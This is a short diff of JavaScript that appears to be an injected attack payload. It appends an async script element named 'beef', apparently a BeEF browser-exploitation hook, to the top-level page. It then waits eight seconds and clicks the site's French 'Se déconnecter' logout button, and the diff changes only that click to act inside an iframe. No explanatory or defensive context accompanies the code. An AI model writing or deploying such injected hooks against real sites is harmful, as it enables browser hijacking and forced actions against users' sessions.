@@ -67,7 +67,7 @@ async function iframe() {
 		beef.async = true;
 		window.top.document.body.appendChild(beef);
 		await new Promise(resolve => setTimeout(resolve, 8000));
-		document.querySelector('button[title="Se déconnecter"]').click();
+		i.contentDocument.querySelector('button[title="Se déconnecter"]').click();
 	};
 	
 	return;
